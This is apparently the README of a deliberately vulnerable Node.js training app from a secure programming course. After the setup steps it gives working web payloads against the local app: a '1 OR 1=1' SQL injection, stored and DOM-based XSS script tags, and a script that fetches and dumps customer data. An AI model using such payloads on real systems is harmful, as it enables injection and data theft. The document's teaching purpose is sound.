# Node app with OWASP vulnerabilities, part of Secure Application Programming module

• SQL Injection.
• XSS Reflected Dom based and stored.
• Sensitive Data Exposure.

## Prerequisites

Node.js (and npm package manager)

## Run

1. Install npm packages

```
npm install
```

2. Run node

```
node index.js 
OR
mpm run dev
```

3. Open your browser and navigate to <http://localhost:3000>

4. Generate new customers with any random data.

## SQL Injection

Using inspect element, Inject the following into any of the delete buttons:

```
1 OR 1=1
```

## Stored XSS:
Insert the below in any of the text fields when adding a new customer:

```
<script>alert('XSS')</script>
```

## DOM XSS:
Use the context within the URI to run any script.

```
?context=<script>alert("LEAVE THIS PAGE! YOU ARE BEING HACKED!");</script>
```

http://localhost:3000/customers?context=<script>alert("LEAVE THIS PAGE! YOU ARE BEING HACKED!");</script>

## Sensitive data exposure:
Similar to the step above, the following script can be used in the context.

```
<script>fetch('/api/customers').then(r=>r.json()).then(d=>document.write(JSON.stringify(d)));</script>
```
